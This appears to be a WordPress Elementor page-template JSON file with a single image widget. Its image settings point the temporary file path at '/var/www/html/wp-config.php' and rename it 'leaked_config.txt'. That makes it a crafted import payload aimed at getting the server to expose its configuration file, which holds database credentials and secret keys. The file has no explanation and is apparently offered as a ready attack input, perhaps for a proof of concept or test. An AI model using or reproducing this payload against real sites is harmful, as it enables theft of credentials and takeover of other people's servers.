{
  "content": [{
    "id": "s1",
    "elType": "section",
    "settings": [],
    "elements": [{
      "id": "c1",
      "elType": "column",
      "settings": {"_column_size": 100},
      "elements": [{
        "id": "w1",
        "elType": "widget",
        "widgetType": "image",
        "settings": {
          "image": {
            "url": "http://x.com/x.jpg",
            "id": 1,
            "tmp_name": "/var/www/html/wp-config.php",
            "name": "leaked_config.txt"
          }
        },
        "elements": []
      }]
    }]
  }],
  "version": "0.4",
  "type": "page"
}
